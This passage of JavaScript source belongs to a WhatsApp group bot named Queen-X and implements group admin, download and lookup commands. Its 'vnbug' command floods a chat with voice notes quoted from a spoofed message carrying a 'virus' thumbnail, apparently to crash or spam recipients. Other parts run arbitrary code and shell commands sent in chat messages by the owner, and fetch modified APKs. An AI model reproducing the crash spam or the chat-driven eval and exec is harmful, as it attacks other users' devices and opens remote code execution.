                m.reply(`${XeonBotInc.user.name} has been unmuted in this group !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, `Mute Bot`, botname, m)
                }
             }
             break
	case 'add': {
	      XeonBotInc.sendMessage(from, { react: { text: `⏬️`, key: m.key }})
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'owner': case 'creator': case 'moderator': case 'mod': {
XeonBotInc.sendMessage(from, { react: { text: `💃`, key: m.key }})
XeonBotInc.sendContact(m.chat, owner, m)
}
            break
	case 'mediafire': {
XeonBotInc.sendMessage(from, { react: { text: `📂`, key: m.key }})
if (!text) throw mess.linkm
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw `The link you provided is invalid`
const { mediafireDl } = require('./lib/mediafire.js')
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 999) return m.reply('*File Over Limit* '+util.format(baby1))
const result4 = `*MEDIAFIRE DOWNLOADER*
				
*𝙽𝚊𝚖𝚎* : ${baby1[0].nama}
*𝚂𝚒𝚣𝚎* : ${baby1[0].size}
*𝙼𝚒𝚖𝚎* : ${baby1[0].mime}
*𝙻𝚒𝚗𝚔* : ${baby1[0].link}`
m.reply(`${result4}`)
XeonBotInc.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply(mess.error))
}
break
	case 'git': case 'gitclone':
if (!args[0]) return m.reply(`*[ 💃🏻 Qᴜᴇᴇɴ-x ʙᴏᴛ ᴍᴅ 💃🏻 ]*\n*🖥️ ɢɪᴛ :*\nhttps://github.com/yureshofficial/Queen-X`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    XeonBotInc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
break
case 'tagall': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
let teks = ` TAG ALL 🏷️
 
  *Message : ${q ? q : 'empty'}*\n\n`
                for (let mem of participants) {
                teks += `♾️ @${mem.id.split('@')[0]}\n`
                }
                XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case 'hidetag': {
            if (!m.isGroup) throw mess.group
            if (!isBotAdmins) throw mess.botAdmin
            if (!isAdmins) throw mess.admin
            XeonBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
			case 'chat': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    XeonBotInc.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    XeonBotInc.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    XeonBotInc.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    XeonBotInc.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    XeonBotInc.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    XeonBotInc.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    XeonBotInc.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'The message was not sent by a bot!'
                XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
	case 'promote': {
	      XeonBotInc.sendMessage(from, { react: { text: `🆕`, key: m.key }})
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
	      XeonBotInc.sendMessage(from, { react: { text: `🚮`, key: m.key }})
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	 case 'setname': case 'setsubject': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await XeonBotInc.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
	            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await XeonBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`*Successfully Opened Edit Group Info*`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await XeonBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`*Successfully Close Edit Group Info*`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await XeonBotInc.sendButtonText(m.chat, buttons, `Mode Edit Info`, botname, m)

            }
            }
            break	
            
                        case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                let response = await XeonBotInc.groupInviteCode(m.chat)
                XeonBotInc.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break	
            	
                case 'ping': case 'botstatus': case 'statusbot': case 'p': {
            XeonBotInc.sendMessage(from, { react: { text: `🏷️`, key: m.key }})
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

*💃QUEEN-X INFO SERVER*
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
            }
            break
			
			            case 'join': {
			                  XeonBotInc.sendMessage(from, { react: { text: `⏬`, key: m.key }})
                if (!isCreator) throw mess.owner
                if (!text) throw 'Enter the group link!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await XeonBotInc.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break			
				case 'kick': case 'dan': {
				XeonBotInc.sendMessage(from, { react: { text: `👨‍💻️`, key: m.key }})
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break			
			
case 'modapk': case 'apkmod':
if (!text) throw `*[❗] 𝙸𝙽𝙶𝚁𝙴𝙴𝚂𝙴 𝙴𝙻 𝙽𝙾𝙼𝙱𝚁𝙴 𝙳𝙴 𝙻𝙰 𝙰𝙿𝙺 𝚀𝚄𝙴 𝚀𝚄𝙸𝙴𝚁𝙰 𝙱𝚄𝚂𝙲𝙰𝚁*`        
const data2 = await fetchJson('https://api.akuari.my.id/search/searchmod2?query=' + text)
global.fetchJson = fetchJson
const data = data2.respon
if (data.length < 1) return await  XeonBotInc.sendMessage(m.chat, { text: '*[❗] 𝙽𝙾 𝙵𝚄𝙴 𝙿𝙾𝚂𝙸𝙱𝙻𝙴 𝙴𝙽𝙲𝙾𝙽𝚃𝚁𝙰𝚁 𝚁𝙴𝚂𝚄𝙻𝚃𝙰𝙳𝙾𝚂 𝙳𝙴 𝙻𝙰 𝙰𝙿𝙺*' }, { quoted: m } )
var srh = [];  
for (var i = 0; i < data.length; i++) {
srh.push({ title: data[i].title, description: '', rowId: prefix + 'dapk2 ' + data[i].link });}
const sections = [{title: '𝚂𝙴𝙻𝙴𝙲𝙲𝙸𝙾𝙽𝙰 𝙴𝙻 𝙼𝙾𝙳 𝙰 𝙳𝙴𝚂𝙲𝙰𝚁𝙶𝙰𝚁', rows: srh}]
const listMessage = {text: `┌───[MODAPK BY QUEEN X]\n│\n│- 📟 𝚁𝙴𝚂𝚄𝙻𝚃𝙰𝙳𝙾𝚂 𝙳𝙴: ${text}\n│\n└─────────────────◉`, footer: botname, title: null, buttonText: "SELECT", sections}
await XeonBotInc.sendMessage(m.chat, listMessage, { quoted: m })
break
			
case 'block': {
      XeonBotInc.sendMessage(from, { react: { text: `🚮️`, key: m.key }})
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
      XeonBotInc.sendMessage(from, { react: { text: `✔️`, key: m.key }})
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.updateBlockStatus(users, 'unblock✔️').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
			case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
      XeonBotInc.sendMessage(from, { react: { text: `🚮`, key: m.key }})
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
XeonBotInc.groupRevokeInvite(m.chat)
}
break
case 'dapk2': 
if (!text) throw `*PUKA DENNA ASAI: ${prefix + command}* https://rexdl.com/android/minecraft-pocket-edition-apk-download1.html/`     
await conn.reply(m.chat, global.wait, m)
let data5 = await fetchJson('https://api.akuari.my.id/downloader/dlmod2?link=' + text)
if ( data5.respon.size.replace(' MB' , '') > 200) return await XeonBotInc.sendMessage(m.chat, { text: '*[ ⛔ ] ᴇʟ ᴀʀᴄʜɪᴠᴏ ᴇs ᴅᴇᴍᴀsɪᴀᴅᴏ ᴘᴇsᴀᴅᴏ*' }, { quoted: m } )
if ( data5.respon.size.includes('GB')) return await XeonBotInc.sendMessage(m.chat, { text: '*[ ⛔ ] ᴇʟ ᴀʀᴄʜɪᴠᴏ ᴇs ᴅᴇᴍᴀsɪᴀᴅᴏ ᴘᴇsᴀᴅᴏ*' }, { quoted: m } )
const apk5 = await XeonBotInc.sendMessage(m.chat, { document: { url: data5.respon.download[0].url }, mimetype: 'application/vnd.android.package-archive', fileName: data5.respon.title + '.apk', caption: null }, { quoted: m })   
break
case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'Menu' }, type: 1 }]
                await XeonBotInc.sendButtonText(m.chat, buttons, lowq, botname, m, {quoted: fkontak})
            	}
            break
        case 'ringtone': {
        XeonBotInc.sendMessage(from, { react: { text: `🔊`, key: m.key }})
		if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		XeonBotInc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
case 'movie': 
if (!text) return m.reply(`_Name a Series or movie`)
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           XeonBotInc.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
		

	case 'vnbug':{
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
xeonyvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": botname, 
                "jpegThumbnail": xpicvirus
            } 
        } 
    }
 xeonyaud = fs.readFileSync('./XtroidGallery/audio/fullChudaiBaazi.mp3')
 XeonBotInc.sendMessage(m.chat, {audio: xeonyaud, mimetype: 'audio/mpeg', ptt:true }, {quoted: xeonyvn})
 }
 }
break			
			
			
		

            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Find Partners', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }       

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
